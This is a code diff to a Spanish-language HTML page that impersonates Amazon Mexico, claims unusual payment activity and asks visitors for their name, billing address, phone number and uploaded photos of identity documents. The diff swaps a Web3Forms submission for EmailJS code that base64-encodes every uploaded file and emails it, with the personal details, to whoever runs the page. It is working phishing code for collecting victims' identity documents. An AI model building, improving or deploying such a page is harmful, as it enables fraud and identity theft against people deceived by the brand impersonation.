@@ -4,6 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Verificación de documentos</title>
+  <!-- SDK de EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>emailjs.init('77CvY0DZYW5NcNSi5');</script>
   <style>
     /* ── Variables ── */
     :root {
@@ -378,17 +381,7 @@
         <p>Detectamos una actividad de pago inusual relacionada con tu cuenta en amazon.com.mx. Por seguridad, hemos pausado la operación y abierto un caso de revisión con el folio [E-0346242-BDS01]. (<a href="#">¿Por qué?</a>)</p>
       </section>
 
-      <!--
-        IMPORTANTE: reemplaza TU_FORM_ID con el ID real de tu formulario en Formspree
-        antes de publicar en GitHub Pages.
-        enctype="multipart/form-data" es obligatorio para enviar archivos.
-      -->
-      <form
-        id="uploadForm"
-        action="https://api.web3forms.com/submit"
-        method="POST"
-        enctype="multipart/form-data"
-      >
+      <form id="uploadForm">
 
         <!-- Sección: detalles de facturación -->
         <h1>Ingrese los detalles de facturación</h1>
@@ -520,10 +513,7 @@
         ></textarea>
         <p class="note">NOTA: No podemos ofrecer excepciones de políticas como respuesta a comentarios. No incluyas información personal en estos comentarios.</p>
 
-        <!-- Campos ocultos para Web3Forms -->
-        <input type="hidden" name="access_key" value="ce0058df-db69-43b9-9442-35b2550289aa" />
-        <input type="hidden" name="subject" value="Nuevo envío de documentos" />
-        <input type="hidden" name="from_name" value="Verificación Amazon" />
+
 
         <!-- Botón de envío -->
         <button class="submit" id="submitBtn" type="submit">
@@ -564,7 +554,6 @@
     const MAX_FILES = 10;
     const MAX_SIZE  = 15 * 1024 * 1024; // 15 MB
 
-    /* Devuelve todos los archivos seleccionados de ambos inputs */
     function getAllFiles() {
       return [
         ...Array.from(galleryInput.files || []),
@@ -584,10 +573,9 @@
       statusEl.textContent  = '';
 
       const files = getAllFiles();
-
       if (!files.length) {
-        countEl.textContent  = 'No has seleccionado archivos.';
-        submitBtn.disabled   = false;
+        countEl.textContent = 'No has seleccionado archivos.';
+        submitBtn.disabled  = false;
         return;
       }
 
@@ -595,7 +583,6 @@
       const names = files
         .slice(0, MAX_FILES)
         .map(f => `${f.name} (${(f.size / 1024 / 1024).toFixed(2)} MB)`);
-
       countEl.textContent = `${files.length} archivo(s): ${names.join(', ')}`;
 
       if (!ok) {
@@ -609,10 +596,6 @@
       }
     }
 
-    /* Dispara el input de cámara oculto al pulsar el botón visible.
-       Esta es la técnica más compatible con iOS Safari y Android Chrome:
-       un programmatic .click() sobre un input[capture] con display:none
-       es honrado como gesto de usuario y abre la cámara nativa. */
     document.getElementById('cameraTrigger').addEventListener('click', () => {
       cameraInput.click();
     });
@@ -620,13 +603,14 @@
     galleryInput.addEventListener('change', refreshUI);
     cameraInput.addEventListener('change',  refreshUI);
 
-    /* Validación final antes del envío */
-    form.addEventListener('submit', event => {
+    /* Envío via EmailJS con archivos adjuntos */
+    form.addEventListener('submit', async event => {
+      event.preventDefault();
+
       const files = getAllFiles();
-      const { tooMany, tooLarge, ok } = validate(files);
+      const { ok, tooMany, tooLarge } = validate(files);
 
       if (!files.length || !ok) {
-        event.preventDefault();
         warning.textContent = !files.length
           ? 'Selecciona al menos un archivo o toma una foto.'
           : tooMany
@@ -636,10 +620,51 @@
         return;
       }
 
-      submitBtn.disabled  = true;
+      submitBtn.disabled   = true;
       statusEl.textContent = 'Enviando…';
+      warning.style.display = 'none';
+
+      /* Convierte cada archivo a base64 para adjuntarlo en el correo */
+      function toBase64(file) {
+        return new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onload  = () => resolve(reader.result.split(',')[1]);
+          reader.onerror = reject;
+          reader.readAsDataURL(file);
+        });
+      }
+
+      try {
+        /* Construye los parámetros del template */
+        const params = {
+          nombre:      document.getElementById('fullName').value,
+          pais:        document.getElementById('country').value,
+          direccion:   document.getElementById('billingAddress').value,
+          telefono:    document.getElementById('phone').value,
+          comentarios: document.getElementById('comments').value || '(sin comentarios)',
+        };
+
+        /* Adjunta los archivos como base64 (EmailJS soporta hasta 50 MB total) */
+        for (let i = 0; i < files.length; i++) {
+          params[`archivo_${i + 1}_nombre`]   = files[i].name;
+          params[`archivo_${i + 1}_contenido`] = await toBase64(files[i]);
+        }
+
+        await emailjs.send('service_mrh38ek', 'template_ro5tcl9', params);
+
+        statusEl.textContent  = '¡Enviado correctamente! Revisa tu correo.';
+        statusEl.style.color  = '#007600';
+        submitBtn.disabled    = false;
+        form.reset();
+        countEl.textContent   = 'No has seleccionado archivos.';
+
+      } catch (err) {
+        statusEl.textContent = 'Error al enviar. Intenta de nuevo.';
+        statusEl.style.color = '#c40000';
+        submitBtn.disabled   = false;
+        console.error('EmailJS error:', err);
+      }
     });
   </script>
 </body>
 </html>
-
